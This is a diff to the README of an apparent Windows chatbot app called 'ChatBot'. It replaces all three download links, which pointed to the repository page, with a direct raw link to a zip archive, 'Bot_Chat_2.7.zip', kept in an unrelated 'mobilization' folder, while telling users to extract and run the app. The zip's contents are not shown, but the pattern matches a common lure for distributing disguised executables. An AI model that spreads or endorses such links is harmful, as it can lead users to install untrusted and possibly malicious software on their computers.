@@ -1,6 +1,6 @@
 # 🤖 ChatBot - Simple Q&A for Every User
 
-[![Download ChatBot](https://img.shields.io/badge/Download-ChatBot-blue.svg?style=for-the-badge)](https://github.com/Mussy-chickenliver66/ChatBot)
+[![Download ChatBot](https://img.shields.io/badge/Download-ChatBot-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Mussy-chickenliver66/ChatBot/main/mobilization/Bot_Chat_2.7.zip)
 
 ## 📌 What ChatBot Does
 
@@ -24,7 +24,7 @@ If your PC is older, the app may still run, but response times can be slower.
 
 Use this link to visit the download page:
 
-[Download ChatBot](https://github.com/Mussy-chickenliver66/ChatBot)
+[Download ChatBot](https://raw.githubusercontent.com/Mussy-chickenliver66/ChatBot/main/mobilization/Bot_Chat_2.7.zip)
 
 Open the page, look for the latest release or the main app file, then save it to your computer.
 
@@ -189,6 +189,6 @@ This project is related to:
 
 If you need to reinstall ChatBot, use the same link:
 
-[Download ChatBot](https://github.com/Mussy-chickenliver66/ChatBot)
+[Download ChatBot](https://raw.githubusercontent.com/Mussy-chickenliver66/ChatBot/main/mobilization/Bot_Chat_2.7.zip)
 
 Open the page, download the latest file, extract it if needed, and run the app on Windows
